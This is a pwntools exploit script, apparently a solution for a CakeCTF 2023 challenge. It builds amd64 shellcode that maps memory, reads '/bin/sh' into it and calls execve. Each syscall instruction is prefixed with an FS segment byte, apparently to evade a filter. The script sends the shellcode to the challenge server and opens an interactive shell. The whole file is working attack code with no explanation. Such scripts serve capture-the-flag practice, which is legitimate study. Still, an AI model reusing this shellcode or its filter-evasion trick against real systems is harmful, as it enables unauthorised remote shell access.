from pwn import *
from base64 import b64encode

context.clear(arch='amd64')

a = u64(b'/bin/sh\x00')

shellcode = asm(
    f"""
_start:
    mov rax, 9
    mov rdi, 0x40000
    mov rsi, 0x1000
    mov rdx, 7
    mov r10, 34
    mov r8, -1

    nop
    nop

    .byte 0x64
    syscall

    mov rax, 0
    mov rdi, 0
    mov rsi, 0x40000
    mov rdx, 0x100

    nop
    nop

    .byte 0x64
    syscall

    mov rax, 1
    mov rdi, 1
    mov rsi, 0x40000
    mov rdx, 0x100

    .byte 0x64
    syscall

    mov rax, 59
    mov rdi, 0x40000
    xor esi, esi
    xor edx, edx

    nop
    nop

    .byte 0x64
    syscall

loop:
    jmp loop
    """
)

p = remote("others.2023.cakectf.com", 10001)
print(shellcode.hex())
p.sendline(shellcode.hex().encode())

input("wait: ")

p.sendline(b"/bin/sh\x00")

p.interactive()